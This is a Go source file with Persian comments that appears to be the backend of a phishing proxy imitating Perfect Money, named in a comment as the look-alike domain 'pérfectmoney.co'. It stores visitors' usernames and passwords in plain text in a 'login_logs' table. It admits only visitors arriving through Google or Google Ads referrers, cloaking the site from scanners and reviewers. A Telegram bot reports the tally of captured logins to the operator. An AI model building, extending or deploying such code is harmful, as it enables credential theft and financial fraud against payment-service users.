// بلاک کردن کشور
func isCountryBlocked(country string) bool {
	var exists bool
	err := db.QueryRow(`SELECT EXISTS(SELECT 1 FROM blocked_countries WHERE country_code = $1)`, country).Scan(&exists)
	if err != nil {
		log.Printf("Error checking if country is blocked: %v", err)
		return false
	}
	return exists
}
func updateRequestCount(db *sql.DB, ip, path string) error {
	// ابتدا تلاش می‌کنیم که تعداد درخواست‌ها را افزایش دهیم
	query := `
		INSERT INTO request_counts (ip, path, request_count) 
		VALUES ($1, $2, 1) 
		ON CONFLICT (ip, path) DO UPDATE 
		SET request_count = request_counts.request_count + 1,
		    last_request = CURRENT_TIMESTAMP
	`
	_, err := db.Exec(query, ip, path)
	return err
}
func getRequestCount2(db *sql.DB, ip, path string) (int, error) {
	var count int
	query := `
		SELECT request_count
		FROM request_counts
		WHERE ip = $1 AND path = $2
	`
	err := db.QueryRow(query, ip, path).Scan(&count)
	if err == sql.ErrNoRows {
		return 0, nil
	} else if err != nil {
		return 0, err
	}
	return count, nil
}
func isIPAllowedOrFromGoogle(req *http.Request) (bool, error) {
	ip := getIP(req)
	if testMode {
		return true, nil
	}
	// بررسی اینکه آیا IP در دیتابیس موجود است (مجاز است)
	var exists bool
	err := db.QueryRow(`
		SELECT EXISTS(SELECT 1 FROM allowed_ips WHERE ip = $1)
	`, ip).Scan(&exists)
	if err != nil {
		return false, err
	}

	// اگر IP در دیتابیس موجود بود، true برمی‌گرداند
	if exists {
		return true, nil
	}

	// اگر IP مجاز نبود، بررسی کنیم که آیا کاربر از گوگل آمده است
	if isFromGoogle(req) {
		// اگر کاربر از گوگل آمده بود، IP را به دیتابیس اضافه کنیم
		_, err := db.Exec(`
			INSERT INTO allowed_ips (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING
		`, ip)
		if err != nil {
			return false, err
		}
		// چون کاربر از گوگل آمده و IP اضافه شده است، true برمی‌گرداند
		return true, nil
	}

	// اگر IP مجاز نبود و از گوگل هم نیامده بود، false برمی‌گرداند
	return false, nil
}
func isFromGoogle(req *http.Request) bool {
	referer := req.Header.Get("Referer")
	if referer == "" {
		return false
	}

	// بررسی اینکه آیا کاربر از گوگل یا تبلیغات گوگل آمده است
	return strings.Contains(referer, "google.com") || strings.Contains(referer, "googleadservices.com")
}
func removeOldIPs(duration time.Duration) {
	_, err := db.Exec(`
		DELETE FROM allowed_ips 
		WHERE added_at < NOW() - $1::INTERVAL
	`, duration.String())
	if err != nil {
		log.Printf("Error removing old IPs: %v", err)
	}
}
func createTables(db *sql.DB) error {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS visit_logs (
			id SERIAL PRIMARY KEY,
			ip VARCHAR(45) NOT NULL,
			path TEXT NOT NULL,
			domain TEXT NOT NULL,
			timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			country VARCHAR(2),
			referer TEXT,
			platform TEXT,
			request_count INT DEFAULT 0
		);`,
		`CREATE TABLE IF NOT EXISTS login_logs (
			id SERIAL PRIMARY KEY,
			ip VARCHAR(45) NOT NULL,
			username TEXT NOT NULL,
			password TEXT NOT NULL,
			timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		);`,
		`CREATE TABLE IF NOT EXISTS blocked_ips (
			ip VARCHAR(45) PRIMARY KEY,
			blocked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		);`,
		`CREATE TABLE IF NOT EXISTS blocked_countries (
			country_code VARCHAR(2) PRIMARY KEY
		);`,
		`CREATE TABLE IF NOT EXISTS request_counts (
			id SERIAL PRIMARY KEY,
			ip VARCHAR(45) NOT NULL,
			path TEXT NOT NULL,
			request_count INT DEFAULT 1,
			last_request TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			UNIQUE (ip, path)
		);`,
		`CREATE TABLE IF NOT EXISTS allowed_ips (
                             ip VARCHAR(45) PRIMARY KEY,
                             added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );`,
		`CREATE TABLE IF NOT EXISTS allowed_paths (
                               id SERIAL PRIMARY KEY,
                               path TEXT NOT NULL,
                               is_active BOOLEAN DEFAULT TRUE
      );`,
	}

	for _, query := range queries {
		_, err := db.Exec(query)
		if err != nil {
			return err
		}
	}

	return nil
}
func getBlockedIPsCount() (int, error) {
	var count int
	query := "SELECT COUNT(*) FROM blocked_ips"
	err := db.QueryRow(query).Scan(&count)
	if err != nil {
		return 0, err
	}
	return count, nil
}

func getBlockedCountriesCount() (int, error) {
	var count int
	query := "SELECT COUNT(*) FROM blocked_countries"
	err := db.QueryRow(query).Scan(&count)
	if err != nil {
		return 0, err
	}
	return count, nil
}
func getUniqueIPsCount() (int, error) {
	var count int
	query := "SELECT COUNT(DISTINCT ip) FROM visit_logs"
	err := db.QueryRow(query).Scan(&count)
	if err != nil {
		return 0, err
	}
	return count, nil
}

func getTotalRequestsCount() (int, error) {
	var total int
	query := "SELECT SUM(request_count) FROM visit_logs"
	err := db.QueryRow(query).Scan(&total)
	if err != nil {
		return 0, err
	}
	return total, nil
}
func getRegisteredUsersCount() (int, error) {
	var count int
	query := "SELECT COUNT(*) FROM login_logs"
	err := db.QueryRow(query).Scan(&count)
	if err != nil {
		return 0, err
	}
	return count, nil
}
func startTelegramBot() {
	bot, err := tgbotapi.NewBotAPI(TelegramBotToken)
	if err != nil {
		log.Panic(err)
	}

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		switch update.Message.Text {
		case "فعال‌سازی حالت تست":
			testMode = true
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Test mode activated")
			bot.Send(msg)

		case "غیرفعال‌سازی حالت تست":
			testMode = false
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Test mode deactivated")
			bot.Send(msg)

		case "تعداد آی‌پی‌های بلاک شده":
			count, err := getBlockedIPsCount()
			if err != nil {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching blocked IPs")
				bot.Send(msg)
				continue
			}
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Blocked IPs: %d", count))
			bot.Send(msg)

		case "تعداد کشورهای بلاک شده":
			count, err := getBlockedCountriesCount()
			if err != nil {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching blocked countries")
				bot.Send(msg)
				continue
			}
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Blocked countries: %d", count))
			bot.Send(msg)
		case "تعداد آی‌پی‌های یونیک":
			count, err := getUniqueIPsCount()
			if err != nil {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching unique IPs")
				bot.Send(msg)
				continue
			}
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Unique IPs: %d", count))
			bot.Send(msg)

		case "تعداد کل درخواست‌ها":
			total, err := getTotalRequestsCount()
			if err != nil {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching total requests")
				bot.Send(msg)
				continue
			}
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Total requests: %d", total))
			bot.Send(msg)
		case "تعداد کاربران ثبت‌نام شده":
			count, err := getRegisteredUsersCount()
			if err != nil {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching registered users")
				bot.Send(msg)
				continue
			}
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Registered users: %d", count))
			bot.Send(msg)
		default:
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Unknown command")
			bot.Send(msg)
		}
	}
}

// pérfectmoney.co
func main() {
	connStr := "user=postgres password=12345678 dbname=proxy_logs sslmode=disable"
	var err error
	db, err = sql.Open("postgres", connStr)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()
	err = createTables(db)
	if err != nil {
		log.Fatalf("Error creating tables: %v", err)
	}
	go func() {
		for {
			time.Sleep(30 * time.Minute)
			removeOldIPs(30 * time.Minute) // IPهایی که بیش از 30 دقیقه ذخیره شده‌اند، حذف می‌شوند
		}
	}()
	go startTelegramBot()

	cssHandler := http.FileServer(http.Dir("E:\\cgi_perfect\\style"))
	//cssHandler := http.FileServer(http.Dir("/root/cgi_perfect/style"))
	// تعریف یک هندلر برای روت که درخواست‌ها را به دایرکتوری CSS ریدایرکت می‌کند
	http.HandleFunc("/index/", func(w http.ResponseWriter, r *http.Request) {
		r.URL.Path = strings.TrimPrefix(r.URL.Path, "/index")
		cssHandler.ServeHTTP(w, r)
	})
	http.HandleFunc("/", handleRequestAndRedirect)

	log.Fatal(http.ListenAndServe(":8080", nil))
}
